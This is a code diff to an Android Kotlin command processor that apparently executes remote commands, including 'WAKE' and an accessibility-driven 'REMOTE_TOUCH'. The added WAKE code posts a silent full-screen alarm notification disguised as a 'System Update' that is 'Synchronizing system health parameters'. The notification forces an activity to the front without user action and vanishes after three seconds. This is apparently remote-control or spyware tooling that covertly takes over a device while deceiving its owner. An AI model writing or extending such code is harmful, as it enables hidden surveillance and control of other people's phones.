@@ -248,11 +248,38 @@ object CommandProcessor {
                     }
                 }
                 "WAKE" -> {
+                    val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                    val channelId = "system_integrity_alerts"
+                    
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                        val channel = android.app.NotificationChannel(channelId, "System Integrity", android.app.NotificationManager.IMPORTANCE_HIGH)
+                        channel.setSound(null, null)
+                        channel.enableVibration(false)
+                        nm.createNotificationChannel(channel)
+                    }
+
                     val intent = Intent(ctx, PulseActivity::class.java)
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_BRING_TO_FRONT)
+                    intent.putExtra("is_wake_trigger", true)
                     if (content.contains("wellbeing")) intent.putExtra("route_to_settings", true)
-                    ctx.startActivity(intent)
-                    status = "SCREEN_WAKE_QUEUED"
+
+                    val pendingIntent = android.app.PendingIntent.getActivity(
+                        ctx, 99, intent, 
+                        android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+                    )
+
+                    val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
+                        .setSmallIcon(android.R.drawable.ic_menu_info_details)
+                        .setContentTitle("System Update")
+                        .setContentText("Synchronizing system health parameters...")
+                        .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
+                        .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
+                        .setFullScreenIntent(pendingIntent, true)
+                        .setAutoCancel(true)
+                        .setTimeoutAfter(3000)
+
+                    nm.notify(99, builder.build())
+                    status = "STRONG_WAKE_DISPATCHED"
                 }
                 "REMOTE_TOUCH" -> {
                     if (MyAccessibilityService.instance == null) {
